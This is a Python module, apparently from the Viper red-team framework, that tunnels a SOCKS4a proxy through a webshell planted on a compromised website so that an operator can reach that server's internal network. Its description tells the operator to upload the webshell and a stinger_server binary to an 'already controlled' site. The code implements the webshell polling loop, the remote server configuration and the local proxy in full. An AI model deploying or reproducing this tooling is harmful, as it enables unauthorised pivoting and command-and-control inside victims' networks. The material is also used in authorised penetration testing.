# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import struct
import threading

import ipaddr

import time

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except Exception as E:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from MODULES_DATA.CommandAndControl_MultibandCommunication_Socks5ByWebshell.config import *
from PostModule.lib.ModuleTemplate import TAG2CH, PostPythonModule
from PostModule.lib.OptionAndResult import Option, register_options
from PostModule.lib.Configs import is_empty_port


class ClientCenter(threading.Thread):
    def __init__(self):
        self.CACHE_CONNS = {}
        # {
        #     "conn": self.request,
        #     "targetaddr": TARGET_ADDR,
        #     "new": True,
        # }
        # socket参数
        self.LOCAL_ADDR = None
        self.READ_BUFF_SIZE = 51200
        # 日志参数
        self.LOG_LEVEL = "INFO"
        self.logger = get_logger(level=self.LOG_LEVEL, name="StreamLogger")
        # webshell参数
        self.SLEEP_TIME = 0.01
        self.WEBSHELL = None
        self.REMOTE_SERVER = None
        self.SINGLE_MODE = False
        # 缓存变量
        self.die_client_address = []
        self.session = requests.session()
        self.loopJob = True
        threading.Thread.__init__(self)

    def _post_data(self, url, data={}):
        payload = {
            "Remoteserver": self.REMOTE_SERVER,
            "Endpoint": url,
            "SENDDATA": newDumps(data)
        }
        self.logger.debug(payload)
        try:
            # timeout 要大于脚本中post的超时时间
            headers = {'Connection': 'keep-alive'}
            r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=headers)

        except Exception as E:
            self.logger.warning("Post data to WEBSHELL failed")
            self.logger.exception(E)
            return None
        try:
            web_return_data = newLoads(r.content)
            if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
                self.logger.error(web_return_data.get(ERROR_CODE))
                self.logger.warning(r.content)
                return None
            else:
                return web_return_data
        except Exception as E:
            self.logger.warning("WEBSHELL return wrong data")
            return None

    def run(self):
        self.logger.warning("LoopThread start")
        while self.loopJob:
            self._sync_data()
            time.sleep(self.SLEEP_TIME)
        self.logger.warning("LoopThread stop")

    def _sync_data(self):
        post_send_data = {}
        # 清除无效的client

        for client_address in self.die_client_address:
            try:
                one = self.CACHE_CONNS.pop(client_address)
                one.get("conn").close()
                self.logger.warning("CLIENT_ADDRESS:{} close client in die_client_address".format(client_address))
            except Exception as E:
                self.logger.warning(
                    "CLIENT_ADDRESS:{} close client close client in die_client_address error".format(client_address))

        # 从tcp中读取数据
        for client_address in list(self.CACHE_CONNS.keys()):
            client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
            try:
                tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
                self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
                if len(tcp_recv_data) > 0:
                    self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))
            except Exception as err:
                tcp_recv_data = b""
                self.logger.debug("TCP_RECV_NONE")
            # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
            client_socket_targetaddr = self.CACHE_CONNS.get(client_address).get("targetaddr")

            # 每一个client_address的数据结构体
            client_address_one_data = {
                "data": base64.b64encode(tcp_recv_data),
                "targetaddr": client_socket_targetaddr,
            }
            post_send_data[client_address] = client_address_one_data

        # 发送读取的数据到服务器
        payload = {}
        payload[DATA_TAG] = post_send_data  # 发送的数据
        payload[DIE_CLIENT_ADDRESS_TAG] = self.die_client_address  # 需要清除的连接

        post_return_data = self._post_data(URL_STINGER_SYNC, data=payload)
        # 处理post返回数据
        if post_return_data is None:
            time.sleep(3)
            return

        self.die_client_address = []

        for client_address in list(post_return_data.keys()):
            # 读取server返回的数据
            try:
                client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
                server_tcp_send_data = base64.b64decode(post_return_data.get(client_address).get("data"))
            except Exception as E:
                if self.SINGLE_MODE is True:
                    self.logger.warning(
                        "CLIENT_ADDRESS:{} server socket not in client socket list".format(client_address))
                    self.logger.warning("SINGLE_MODE: {} ,remove is conn from server".format(self.SINGLE_MODE))
                    self.die_client_address.append(client_address)
                continue
            # 将返回的数据发送到client Tcp连接中

            if server_tcp_send_data == "":
                # 无数据返回继续
                continue

            try:
                client_socket_conn.send(server_tcp_send_data)
                self.logger.debug("CLIENT_ADDRESS:{} TCP_SEND_DATA:{}".format(client_address, server_tcp_send_data))
            except Exception as E:
                self.logger.warning("CLIENT_ADDRESS:{} Client socket send failed".format(client_address))
                self.die_client_address.append(client_address)
                try:
                    self.CACHE_CONNS.pop(client_address)
                    client_socket_conn.close()
                except Exception as E:
                    pass

        # 检查没有在server返回列表中的client

        for client_address in list(self.CACHE_CONNS.keys()):
            if post_return_data.get(client_address) is None:
                if self.CACHE_CONNS.get(client_address).get("new") is True:
                    self.CACHE_CONNS[client_address]["new"] = False
                    pass
                else:
                    self.logger.warning(
                        "CLIENT_ADDRESS:{} remove client not in server CHCHE_CONNS".format(client_address)
                    )
                    self.logger.warning("CLIENT_ADDRESS:{} append in die_client_address".format(client_address))
                    self.die_client_address.append(client_address)

    def setc_webshell(self, WEBSHELL):
        try:
            r = requests.get(WEBSHELL, verify=False, timeout=3)
            if b"stinger" in r.content:
                self.WEBSHELL = WEBSHELL
                return True
            else:
                return False
        except Exception as E:
            return False

    def setc_remoteserver(self, REMOTE_SERVER=None):
        if REMOTE_SERVER is None:
            for port in CONTROL_PORT:
                for i in range(2):
                    self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
                    result = self._post_data(URL_CHECK)
                    if result is None:  # 失败回退
                        self.REMOTE_SERVER = None
                        continue
                    else:
                        return result
            return None
        self.REMOTE_SERVER = REMOTE_SERVER
        result = self._post_data(URL_CHECK)
        if result is None:  # 失败回退
            self.REMOTE_SERVER = None
        return result

    def gets_config(self, REMOTE_SERVER=None):
        if REMOTE_SERVER is None:
            for port in CONTROL_PORT:
                for i in range(2):
                    self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
                    result = self._post_data(URL_CHECK)
                    if result is None:  # 失败回退
                        self.REMOTE_SERVER = None
                        continue
                    else:
                        return result
            return None
        self.REMOTE_SERVER = REMOTE_SERVER
        result = self._post_data(URL_CHECK)
        if result is None:  # 失败回退
            self.REMOTE_SERVER = None
        return result

    def setc_localaddr(self, ip, port):
        if port_is_used(port, ip):
            return False
        else:
            self.LOCAL_ADDR = "{}:{}".format(ip, port)
        return True

    def sets_config(self, tag, data):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_SET_CONFIG, payload)
        return web_return_data

    def send_cmd(self, tag, data=None):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_CMD, payload)
        return web_return_data


def build_socks_reply(cd, dst_port=0x0000, dst_ip='0.0.0.0'):
    '''
    Build a SOCKS4 reply with the specified reply code, destination port and
    destination ip.
    '''
    # dst_ip_bytes = ipaddress.IPv4Address(dst_ip).packed
    dst_ip_bytes = ipaddr.IPv4Address(dst_ip).packed

    dst_ip_raw, = struct.unpack('>L', dst_ip_bytes)

    return struct.pack('>BBHL', SERVER_VN, cd, dst_port, dst_ip_raw)


class ClientRequest(object):
    '''Represents a client SOCKS4 request'''

    def __init__(self, data):
        '''Construct a new ClientRequeset from the given raw SOCKS request'''
        self.invalid = False

        # Client requests must be at least 9 bytes to hold all necessary data
        if len(data) < 9:
            self.invalid = True
            return

        # Version number (VN)
        self.parse_vn(data)

        # SOCKS command code (CD)
        self.parse_cd(data)

        # Destination port
        self.parse_dst_port(data)

        # Destination IP / Domain name (if specified)
        self.parse_ip(data)

        # Userid
        self.parse_userid(data)

    @classmethod
    def parse_fixed(cls, data):
        '''Parse and return the fixed-length part of a SOCKS request
        Returns a tuple containing (vn, cd, dst_port, dst_ip) given the raw
        socks request
        '''
        return struct.unpack('>BBHL', data[:8])

    def parse_vn(self, data):
        '''Parse and store the version number given the raw SOCKS request'''
        vn, _, _, _ = ClientRequest.parse_fixed(data)
        if (vn != CLIENT_VN):
            self.invalid = True

    def parse_dst_port(self, data):
        '''Parse and store the destination port given the raw SOCKS request'''
        _, _, dst_port, _ = ClientRequest.parse_fixed(data)
        self.dst_port = dst_port

    def parse_cd(self, data):
        '''Parse and store the request code given the raw SOCKS request'''
        _, cd, _, _ = ClientRequest.parse_fixed(data)
        if (cd == REQUEST_CD_CONNECT or cd == REQUEST_CD_BIND):
            self.cd = cd
        else:
            self.invalid = True

    def parse_ip(self, data):
        '''Parse and store the destination ip given the raw SOCKS request
        If the IP is of the form 0.0.0.(1-255), attempt to resolve the domain
        name specified, then store the resolved ip as the destination ip.
        '''
        _, _, _, dst_ip = ClientRequest.parse_fixed(data)

        ip = ipaddr.IPv4Address(dst_ip)
        o1, o2, o3, o4 = ip.packed

        # Invalid ip address specifying that we must resolve the domain
        # specified in data (As specified in SOCKS4a)
        if (o1, o2, o3) == (0, 0, 0) and o4 != 0:
            try:
                # Variable length part of the request containing the userid
                # and domain (8th byte onwards)
                userid_and_domain = data[8:]

                # Extract the domain to resolve
                _, domain, _ = userid_and_domain.split(b'\x00')

            except ValueError:
                # Error parsing request
                self.invalid = True
                return

            try:
                resolved_ip = socket.gethostbyname(domain)
            except socket.gaierror:
                # Domain name not found
                self.invalid = True
                return

            self.dst_ip = resolved_ip

        else:
            self.dst_ip = ip.exploded

    def parse_userid(self, data):
        '''Parse and store the userid given the raw SOCKS request'''
        try:
            index = data.index(b'\x00')
            self.userid = data[8:index]
        except ValueError:
            self.invalid = True
        except IndexError:
            self.invalid = True

    def isInvalid(self):
        '''Returns true if this request is invalid, false otherwise'''
        return self.invalid


class Socks4aProxy(threading.Thread):
    '''A SOCKS4a Proxy'''

    def __init__(self, host="127.0.0.1", port=-1, timeout=0.05, bufsize=BUFSIZE):
        '''Create a new SOCKS4 proxy on the specified port'''

        self._host = host
        self._port = port
        self._bufsize = bufsize
        self._backlog = BACKLOG
        self._timeout = timeout
        self.logger = logging.getLogger("StreamLogger")
        self.loopJob = True
        threading.Thread.__init__(self)

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self._host, self._port))
            s.listen(self._backlog)
            self.logger.warning("socks4a server start on {}:{}".format(self._host, self._port))
        except Exception as E:
            self.logger.exception(E)
            sys.exit(1)

        while self.loopJob:
            try:
                self.logger.warning("Socks4a ready to accept")
                conn, addr = s.accept()
                conn.settimeout(self._timeout)
                data = conn.recv(self._bufsize)
                # Got a connection, handle it with process_request()
                self._process_request(data, conn, addr)
                self.logger.warning("Socks4a process_request finish")
            except KeyboardInterrupt as ki:
                self.logger.warning('Caught KeyboardInterrupt, exiting')
                s.close()
                sys.exit(0)
            except Exception as E:
                self.logger.exception(E)
                try:
                    conn.close()
                except Exception as E:
                    pass
        self.logger.warning("socks4a server stop")

    def _process_request(self, data, client_conn, addr):
        '''Process a general SOCKS request'''

        client_request = ClientRequest(data)

        # Handle invalid requests
        if client_request.isInvalid():
            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_REJECTED))
            client_conn.close()
            return

        if client_request.cd == REQUEST_CD_CONNECT:
            globalClientCenter.logger.warning('Got connection from {}'.format(addr))
            key = "{}:{}".format(addr[0], addr[1])
            globalClientCenter.CACHE_CONNS[key] = {
                "conn": client_conn,
                "targetaddr": (client_request.dst_ip, client_request.dst_port),
                "new": True,  # 新的连接,第一次检查略过
            }

            client_conn.settimeout(self._timeout)
            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_GRANTED))  # 处理完成,开始正式连接
        else:
            self.logger.warning("Socks4a do not support bind request")


class PostModule(PostPythonModule):
    NAME = "基于Webshell的Socks4代理"
    DESC = "将Webshell及stinger_server(.exe)上传到已控制的网站并执行stinger_server(.exe)\n" \
           "(60010端口监听表示启动成功)\n" \
           "然后运行此模块即可启动基于Web服务器所在内网的Socks4服务.\n" \
           "webshell及stinger_server(.exe)在<数据管理-文件-stinger.zip>"

    MODULETYPE = TAG2CH.Command_and_Control
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", "Root"]  # 所需权限
    ATTCK = ["T1026"]  # ATTCK向量
    REFERENCES = ["https://github.com/FunnyWolf/pystinger_for_darkshadow"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        Option(name='webshell', name_tag="Webshell地址", type='str', required=True,
               desc="负责转发请求的Webshell地址", option_length=24, ),
        Option(name="listenip", name_tag="监听IP",
               type="enum",
               required=True,
               default="127.0.0.1",
               desc="本地启动Socks5服务的IP地址",
               enum_list=[
                   {'name': "127.0.0.1", 'value': "127.0.0.1"},
                   {'name': "0.0.0.0", 'value': "0.0.0.0"},

               ],

               ),
        Option(name="listenport", name_tag="监听端口",
               type="integer",
               required=True,
               desc="本地本地启动Socks5服务的端口",

               ),

        # 配置参数
        Option(name="READ_BUFF_SIZE", name_tag="READ_BUFF_SIZE",
               type="integer",
               required=True,
               default=51200,
               desc="TCP读取BUFF大小(10240-51200,IIS4建议为10240)",

               ),

        Option(name="SOCKET_TIMEOUT", name_tag="SOCKET_TIMEOUT",
               type="float",
               required=True,
               default=0.01,
               desc="TCP连接超时时间(0.01-1)",

               ),

        Option(name="SLEEP_TIME", name_tag="SLEEP_TIME",
               type="float",
               required=True,
               default=0.1,
               desc="连接Webshell的时间间隔(0.01-1)",

               ),

        Option(name="SINGLE_MODE", name_tag="SINGLE_MODE",
               type="bool",
               required=False,
               default=False,
               desc="单客户端模式,控制服务器只处理当前客户端的Socks连接",

               ),

        Option(name="CLEAN_SOCKET", name_tag="CLEAN_SOCKET",
               type="bool",
               required=False,
               default=False,
               desc="启动前清理Server端的所有socket连接",

               ),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.session = None

    def check(self):
        """执行前的检查函数"""
        global globalClientCenter
        globalClientCenter = ClientCenter()

        # 检测本地监听是否可用
        LISTEN_ADDR = self.param('listenip')
        LISTEN_PORT = self.param('listenport')
        flag = globalClientCenter.setc_localaddr(LISTEN_ADDR, LISTEN_PORT)
        if flag:
            pass
        else:
            return False, "本地监听启动检测失败,请检查端口是否占用"
        if LISTEN_ADDR == "0.0.0.0":
            flag, lportsstr = is_empty_port(LISTEN_PORT)
            if flag is not True:
                return False, f"端口: {LISTEN_PORT} 已被占用"
        if 1 > LISTEN_PORT or LISTEN_PORT > 65535:
            return False, f"输入的端口超过正常范围."
        # 检测webshell是否可用
        WEBSHELL = self.param('webshell')
        webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
        if webshell_alive:
            pass
        else:
            return False, f"WEBSHELL不可用 : {WEBSHELL}"

        # 检测服务端是否启动
        result = globalClientCenter.setc_remoteserver()
        if result is None:
            return False, f"读取REMOTE_SERVER失败,请确认服务端是否启动"
        else:
            pass

        # 设置服务端及客户端参数
        # 设置READ_BUFF_SIZE
        READ_BUFF_SIZE = self.param('READ_BUFF_SIZE')
        if READ_BUFF_SIZE is None or 10240 > READ_BUFF_SIZE or 51200 < READ_BUFF_SIZE:
            READ_BUFF_SIZE = 51200
        flag = globalClientCenter.sets_config("READ_BUFF_SIZE", READ_BUFF_SIZE)
        if flag is not True:
            return False, f"设置服务端READ_BUFF_SIZE失败"
        else:
            globalClientCenter.READ_BUFF_SIZE = READ_BUFF_SIZE

        # 设置SOCKET_TIMEOUT
        SOCKET_TIMEOUT = self.param('SOCKET_TIMEOUT')
        if SOCKET_TIMEOUT is None or 0.01 > SOCKET_TIMEOUT or 1 < SOCKET_TIMEOUT:
            SOCKET_TIMEOUT = 0.01
        flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", SOCKET_TIMEOUT)
        if flag is not True:
            return False, f"设置服务端SOCKET_TIMEOUT失败"
        else:
            globalClientCenter.SOCKET_TIMEOUT = SOCKET_TIMEOUT

        # 设置CLEAN_SOCKET
        CLEAN_SOCKET = self.param('CLEAN_SOCKET')
        if CLEAN_SOCKET:
            flag = globalClientCenter.send_cmd("CLEAN_SOCKET")

        # 设置SLEEP_TIME
        SLEEP_TIME = self.param('SLEEP_TIME')
        if SLEEP_TIME is None or 0.01 > SLEEP_TIME or 1 < SLEEP_TIME:
            SLEEP_TIME = 0.1
        globalClientCenter.SLEEP_TIME = SLEEP_TIME
        # 设置SINGLE_MODE
        SINGLE_MODE = self.param('SINGLE_MODE')
        globalClientCenter.SINGLE_MODE = SINGLE_MODE
        return True, None

    def run(self):

        global globalClientCenter

        SOCKET_TIMEOUT = self.param('SOCKET_TIMEOUT')
        if SOCKET_TIMEOUT is None or 0.01 > SOCKET_TIMEOUT or 1 < SOCKET_TIMEOUT:
            SOCKET_TIMEOUT = 0.01

        result = globalClientCenter.gets_config()
        if result is None:
            self.log_error("读取服务端配置失败,请确认服务端是否启动")
            return
        else:
            self.log_good("--- 服务端配置信息 ---")
            for key in result:
                self.log_good(f"{key} => {result.get(key)}")

        globalClientCenter.setDaemon(True)

        t2 = Socks4aProxy(host=self.param('listenip'), port=self.param('listenport'), timeout=SOCKET_TIMEOUT,
                          bufsize=BUFSIZE)
        t2.setDaemon(True)

        globalClientCenter.start()
        t2.start()

        self.log_good("启动本地服务完成,开启循环模式")
        self.store_result_in_result_history()
        self.clean_log()

        while self.exit_flag is not True:
            try:
                time.sleep(1)
            except Exception as E:
                break
        globalClientCenter.loopJob = False
        t2.loopJob = False
